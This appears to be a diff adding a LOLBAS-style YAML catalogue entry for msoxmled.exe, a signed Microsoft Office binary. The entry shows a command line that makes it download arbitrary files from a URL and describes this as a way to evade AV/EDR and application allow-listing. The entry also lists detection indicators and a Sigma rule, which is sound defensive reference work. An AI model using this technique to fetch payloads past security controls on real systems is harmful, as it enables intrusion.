@@ -1,0 +1,36 @@
+    ---
+Name: msoxmled.exe
+Description: Microsoft Office XML Editor, used to handle XML documents in Microsoft Office.
+Author: Bogac Kaya
+Created: 2025-08-22
+Commands:
+  - Command: .\msoxmled.exe /verb open https://live.sysinternals.com/Sysmon64.exe
+    Description: Downloads a file from a specified URL using msoxmled.exe.
+    Usecase: Download arbitrary files from the internet, bypassing AV/EDR due to the legitimate nature of the binary.
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 10, Windows 11
+  - Command: .\msoxmled.exe /verb open https://live.sysinternals.com/Sysmon64.exe
+    Description: Downloads a file from a specified URL using msoxmled.exe, evading defenses by using a signed Microsoft binary.
+    Usecase: Download arbitrary files while evading AV/EDR detection through legitimate signed binary proxy execution.
+    Category: AWL Bypass
+    Privileges: User
+    MitreID: T1218
+    OperatingSystem: Windows 10, Windows 11
+Full_Path:
+  - Path: C:\Program Files\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\Office16\msoxmled.exe
+  - Path: C:\Program Files (x86)\Common Files\Microsoft Shared\OFFICE14\msoxmled.exe
+Detection:
+  - IOC: msoxmled.exe making network connections to external URLs
+  - IOC: Unexpected file downloads initiated by msoxmled.exe
+  - IOC: Event ID 1 with Image: msoxmled.exe and CommandLine: msoxmled.exe /verb open
+  - IOC: Event ID 11 with Image: msoxmled.exe
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_msoxmled_download.yml
+Resources:
+  - Link: https://learn.microsoft.com/en-us/answers/questions/4805030/where-is-msoxmled-exe-for-office-professional-2013
+Acknowledgement:
+  - Person: Bogac Kaya
+    Handle: 'bogackayaa'
+  - Person: Furkan Celik
+    Handle: '@fkrnclk34'
